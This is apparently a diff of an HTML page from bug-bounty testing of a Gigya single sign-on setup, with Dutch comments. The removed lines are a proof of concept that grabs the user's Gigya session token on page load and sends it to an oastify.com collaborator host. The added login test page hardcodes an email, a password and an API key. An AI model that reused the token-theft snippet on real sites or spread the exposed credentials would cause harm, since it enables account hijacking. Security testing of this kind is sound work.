@@ -1,20 +1,79 @@
-<h1>seeel</h1>
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gigya SSO Login Test</title>
+    
+    <script type="text/javascript" src="https://cdns.eu1.gigya.com/js/gigya.js?apiKey=3_DvxBfS7vfR7dan0TcELx5k88RwzDwuFMJh4m03Go3uzuECiu2a3n-XojQCb0azNC"></script>
+</head>
+<body>
 
+    <h2>Gigya SSO Login Testomgeving</h2>
+    <p>Dit formulier test de inlogverbinding met het centrale RTL-ecosysteem vanaf dit domein.</p>
 
-<script src="https://cdns.eu1.gigya.com/js/gigya.js?apiKey=4_hRanGnYDFjdiZQfh-ghhhg"></script>
+    <form id="loginForm" onsubmit="handleLogin(event)">
+        <div>
+            <label for="email">E-mailadres:</label><br>
+            <input type="email" id="email" required value="seel@intigriti.me">
+        </div>
+        <br>
+        <div>
+            <label for="password">Wachtwoord:</label><br>
+            <input type="password" id="password" required value="Tetris1995?!">
+        </div>
+        <br>
+        <button type="submit">Inloggen via Gigya</button>
+    </form>
 
-<script>
-    alert("test")
-    // Zodra de pagina laadt, vraagt het script om de logingegevens
-    gigya.accounts.getAccountInfo({
-        callback: function(response) {
-            if (response.errorCode === 0) {
-                // Gevonden! We hebben het token en de profieldata.
-                var token = response.sessionInfo.sessionToken;
-                
-                // Nu stuurt de hacker dit token stiekem naar zijn eigen server
-                fetch('https://wpphe9dwx4cvgapez8dobl1c73du1kp9.oastify.com/stelen.php?token=' + token);
-            }
+    <hr>
+
+    <h3>Resultaat van de API:</h3>
+    <pre id="output" style="background: #f4f4f4; padding: 15px; border: 1px solid #ccc; max-height: 400px; overflow: auto;">
+Nog niet ingelogd. Wacht op actie...
+    </pre>
+
+    <script type="text/javascript">
+        function handleLogin(event) {
+            // Voorkom dat de pagina herlaadt bij het indienen van het formulier
+            event.preventDefault(); 
+
+            const emailInput = document.getElementById('email').value;
+            const passwordInput = document.getElementById('password').value;
+            const outputDiv = document.getElementById('output');
+
+            outputDiv.innerHTML = "Bezig met inloggen...";
+
+            // De parameters die we meegeven aan de Gigya SDK
+            // Dit komt exact overeen met de parameters uit jouw POST-request
+            const params = {
+                loginID: emailInput,
+                password: passwordInput,
+                sessionExpiration: 7776000, // Duur van de sessie
+                include: "profile,data",    // Vraag expliciet om profiel- en extra data
+                includeUserInfo: true
+            };
+
+            // Roep de officiële Gigya API aan voor accounts login
+            gigya.accounts.login(params, {
+                callback: function(response) {
+                    // Deze functie wordt uitgevoerd zodra Gigya antwoord geeft
+                    if (response.errorCode === 0) {
+                        outputDiv.style.color = "green";
+                        outputDiv.innerHTML = "✅ SUCCES! Je bent ingelogd.\n\n" + JSON.stringify(response, null, 2);
+                        
+                        // Hier kun je nu de data uitlezen, bijvoorbeeld:
+                        console.log("Gebruikers ID:", response.UID);
+                        console.log("E-mail:", response.user.email);
+                        console.log("Profiel:", response.user.profile);
+                    } else {
+                        outputDiv.style.color = "red";
+                        outputDiv.innerHTML = "❌ GIGYA FOUTMAP (Code " + response.errorCode + "):\n\n" + response.errorMessage + "\n\nDetails:\n" + JSON.stringify(response, null, 2);
+                    }
+                }
+            });
         }
-    });
-</script>
+    </script>
+
+</body>
+</html>
